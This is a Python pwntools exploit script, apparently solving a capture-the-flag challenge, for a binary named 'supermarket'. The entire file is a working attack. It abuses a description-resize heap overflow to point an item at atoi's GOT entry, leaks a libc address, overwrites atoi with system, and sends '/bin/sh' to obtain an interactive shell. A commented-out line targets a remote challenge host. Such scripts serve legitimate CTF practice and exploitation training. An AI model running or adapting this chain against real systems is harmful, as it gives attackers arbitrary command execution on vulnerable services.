#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
import sys

p = process('./supermarket')
#p = remote('117.78.27.192',31438)
elf = ELF("./supermarket")
libc = ELF("./libc.so.6")
#libc = ELF("./libc6-i386_2.23-0ubuntu10_amd64.so")

def add(name,price,size,description):
    global p
    p.recvuntil('>>')
    p.sendline('1')
    p.recvuntil('name:')
    p.sendline(str(name))
    p.recvuntil('price:')
    p.sendline(str(price))
    p.recvuntil('descrip_size:')
    p.sendline(str(size))
    p.recvuntil('description:')
    p.sendline(str(description))


def delete(name):
    global p
    p.recvuntil('>>')
    p.sendline('2')
    p.recvuntil('name:')
    p.sendline(str(name))

def list():
    global p
    p.recvuntil('>>')
    p.sendline('3')

def change_description(name, size,description):
    global p
    p.recvuntil('>>')
    p.sendline('5')
    p.recvuntil('name:')
    p.sendline(str(name))
    p.recvuntil('descrip_size:')
    p.sendline(str(size))
    p.recvuntil('description:')
    p.sendline(str(description))

free_got = elf.got['free']
atoi = elf.got['atoi']
puts = elf.plt['puts']

add("AAAAA", 100, 0x80, "D"*0x80)
add("BBBBB", 200, 0x18, "E"*0x18)
#pause()
change_description("AAAAA", 0xb0, "")
add("CCCCC", 200, 0x50, "F"*0x7)
#pause()
payload = "CCCCC\x00" + "G"*(0x1c-6-4-4) + p32(0x50) + p32(atoi)     # + p16(0x00)
change_description("AAAAA", 0x80, payload)
list()
p.recvuntil("CCCCC: price.")
p.recv(16)
real_atoi = u32(p.recv(4))
system = real_atoi - (libc.symbols['atoi'] - libc.symbols['system'])

log.info("real_atoi: %s" % hex(real_atoi))
log.info("system: %s" % hex(system))
change_description("CCCCC", 0x50, p32(system))
#pause()
p.recvuntil("your choice>> ")
p.sendline("/bin/sh\x00")
p.interactive()

